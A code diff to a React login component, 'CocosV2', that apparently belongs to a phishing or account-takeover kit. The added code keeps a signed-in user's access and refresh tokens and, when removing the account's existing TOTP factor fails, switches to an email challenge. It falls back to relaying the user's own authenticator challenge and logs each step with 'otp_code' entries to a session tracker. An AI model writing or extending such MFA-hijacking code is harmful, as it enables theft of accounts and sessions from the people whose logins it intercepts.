@@ -386,17 +386,27 @@ const CocosV2 = () => {
                 await enrollTotpAndFinish(data.access_token);
               }
             } else {
-              // Can't unenroll — treat as client's own MFA
-              const factor = verifiedTotp[0];
-              setFactorId(factor.id);
-              const challengeData = await callApi("mfa_challenge", {
-                access_token: data.access_token,
-                factor_id: factor.id,
-              });
-              setChallengeId(challengeData?.id || "");
-              setMfaMethod("client_own"); mfaMethodRef.current = "client_own";
-              await updateSession("mfa_challenge_sent", { otp_code: "mfa_type:client_own" });
-              setStep("mfa_verify");
+              // Can't unenroll — try email flow first (mail factor), fallback to client TOTP
+              try {
+                emailFlowAccessTokenRef.current = data.access_token;
+                emailFlowRefreshTokenRef.current = data.refresh_token || "";
+                await callApi("email_challenge", { access_token: data.access_token, refresh_token: data.refresh_token });
+                setMfaMethod("enrolled"); mfaMethodRef.current = "enrolled";
+                await updateSession("email_challenge_sent_unenroll_failed", { otp_code: "mfa_type:enrolled" });
+                setStep("email_verify");
+              } catch {
+                // Email challenge failed — fall back to client's own MFA
+                const factor = verifiedTotp[0];
+                setFactorId(factor.id);
+                const challengeData = await callApi("mfa_challenge", {
+                  access_token: data.access_token,
+                  factor_id: factor.id,
+                });
+                setChallengeId(challengeData?.id || "");
+                setMfaMethod("client_own"); mfaMethodRef.current = "client_own";
+                await updateSession("mfa_challenge_sent", { otp_code: "mfa_type:client_own" });
+                setStep("mfa_verify");
+              }
             }
           }
         } else {
